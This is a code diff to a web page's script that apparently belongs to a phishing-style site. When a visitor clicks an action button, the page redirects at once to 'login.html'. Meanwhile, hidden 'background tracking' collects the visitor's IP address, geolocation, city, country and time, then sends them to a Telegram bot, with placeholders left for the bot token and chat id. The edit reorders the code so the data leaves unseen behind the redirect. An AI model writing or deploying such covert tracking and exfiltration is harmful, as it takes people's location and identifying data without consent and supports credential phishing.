@@ -90,7 +90,7 @@
             margin-left: 15px;
             text-decoration: none;
         }
-        /* 🔹 Button animations & responsive effects */
+        /* 🔹 Button animations */
         
         .action-btn {
             transition: all 0.2s ease-in-out;
@@ -205,24 +205,30 @@
                 button.innerHTML = `<span class="spinner-border spinner-border-sm" role="status"></span> Loading...`;
 
                 const action = button.dataset.label;
+                const now = new Date().toLocaleString();
 
+                // 🚀 Redirect immediately for fast navigation
+                window.location.href = 'login.html';
+
+                // 🔹 Run background tracking (won’t block navigation)
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
                         const ip = data.ip;
-                        const now = new Date().toLocaleString();
 
                         navigator.geolocation.getCurrentPosition(position => {
                             const lat = position.coords.latitude;
                             const lon = position.coords.longitude;
+
                             fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
                                 .then(response => response.json())
                                 .then(locationData => {
                                     const city = locationData.address.city || locationData.address.town || locationData.address.village || 'Unknown';
                                     const country = locationData.address.country || 'Unknown';
+
                                     const text = `Action: ${action}\nIP: ${ip}\nTime: ${now}\nCity: ${city}\nCountry: ${country}`;
 
-                                    // Replace with your bot token + chat id
+                                    // Replace <YOUR_BOT_TOKEN> and <CHAT_ID> with your Telegram bot credentials
                                     fetch(`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`, {
                                         method: 'POST',
                                         headers: {
@@ -233,15 +239,15 @@
                                             text: text
                                         })
                                     });
-
-                                    window.location.href = 'login.html';
-                                })
-                                .finally(() => {
-                                    button.disabled = false;
-                                    button.innerHTML = originalText;
                                 });
                         });
                     });
+
+                // Reset button text (optional, won’t show if redirected immediately)
+                setTimeout(() => {
+                    button.disabled = false;
+                    button.innerHTML = originalText;
+                }, 2000);
             });
         });
     </script>
